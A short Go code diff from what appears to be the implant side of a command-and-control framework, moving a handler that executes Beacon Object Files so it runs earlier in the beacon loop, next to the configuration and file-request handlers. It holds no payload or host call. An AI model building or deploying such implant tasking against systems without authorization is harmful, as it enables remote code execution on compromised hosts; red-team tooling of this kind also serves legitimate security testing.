@@ -142,6 +142,12 @@ func main() {
 			client_utils.HandleError(beacon, "configuration", err)
 			continue
 		}
+
+		if err := linux_utils.HandleBOFExecuteRequest(beacon, agentID); err != nil {
+			client_utils.HandleError(beacon, "bof", err)
+			continue
+		}
+
 		if err := client_utils.HandleFileRequest(beacon, agentID); err != nil {
 			client_utils.HandleError(beacon, "file", err)
 			continue
@@ -157,10 +163,6 @@ func main() {
 			continue
 		}
 
-		if err := linux_utils.HandleBOFExecuteRequest(beacon, agentID); err != nil {
-			client_utils.HandleError(beacon, "bof", err)
-			continue
-		}
 
 		beacon.Close()
 		logger.Logf(logger.Info, "Beacon successful")
